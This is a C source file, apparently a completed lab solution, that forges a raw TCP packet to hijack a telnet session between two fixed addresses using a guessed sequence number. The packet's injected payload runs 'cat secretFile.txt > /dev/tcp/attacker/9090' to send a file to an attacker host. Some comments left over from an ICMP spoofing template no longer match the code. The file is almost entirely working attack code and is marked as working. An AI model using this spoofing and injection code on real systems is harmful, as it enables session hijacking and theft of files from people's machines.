#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>

#include "myheader.h"

#define SRC_IP   "10.0.2.15"
#define DEST_IP  "10.0.2.4"
#define DEST_PORT "23"   
#define SRC_PORT "54975"     	
#define SEQ_NUM  "1609100742"  //fill this in

/******************************************************************
  Spoof an ICMP echo request using an arbitrary source IP Address
*******************************************************************/
int main() {  

   char buffer[PACKET_LEN];
  
  memset(buffer, 0, PACKET_LEN);

   /*********************************************************
      Step 1: Fill in the ICMP header.
    ********************************************************/
struct ipheader *ip = (struct ipheader *) buffer;
struct tcpheader *tcp = (struct tcpheader *) (buffer + sizeof(struct ipheader));

char *data = buffer + sizeof(struct ipheader) + sizeof(struct tcpheader);
const char *msg = "\ncat secretFile.txt > /dev/tcp/attacker/9090\n";
int data_len = strlen(msg);
strncpy(data, msg, data_len);


   //actually clears it

   /*********************************************************
      Step 2: Fill in the IP header.
    ********************************************************/
tcp->tcp_sport = htons(atoi(SRC_PORT)); //rand()
tcp->tcp_dport = htons(atoi(DEST_PORT)); //atoi()
tcp->tcp_seq = htonl(atoi(SEQ_NUM)); //rand()
tcp->tcp_offx2 = 0x50;
tcp->tcp_flags = 0x0;
tcp->tcp_win = htons(20000);
tcp->tcp_sum = 0;

ip->iph_ver = 4;
ip->iph_ihl = 5;
ip->iph_ttl = 20;

ip->iph_sourceip.s_addr = inet_addr(SRC_IP);
//inet_addr(SRC_IP);
ip->iph_destip.s_addr = inet_addr(DEST_IP);
ip->iph_protocol = IPPROTO_TCP;
ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader) + data_len);   // + data_len


struct pseudo_tcp fake;
memset(&fake, 0, sizeof(struct pseudo_tcp));
//memset instead of
fake.saddr = ip->iph_sourceip.s_addr; //get actuall ones
fake.daddr = ip->iph_destip.s_addr;
fake.mbz = 0;
fake.ptcl = IPPROTO_TCP;
fake.tcpl = htons(sizeof(struct tcpheader) + data_len);


//put data in the pay load ^

//and put data length in bottom
//fake.tcp = *tcp;

//fake.payload = buffer;
memcpy(&fake.tcp, tcp, sizeof(struct tcpheader));
memcpy(&fake.payload, data, data_len);

tcp->tcp_sum = in_cksum((unsigned short*) &fake, sizeof(struct pseudo_tcp));

   // ip->iph_chksum = ...;

   /*********************************************************
      Step 3: Finally, send the spoofed packet
    ********************************************************/
//fclose(stdout);


   send_raw_ip_packet (ip);
 


   return 0;
}


//WORKS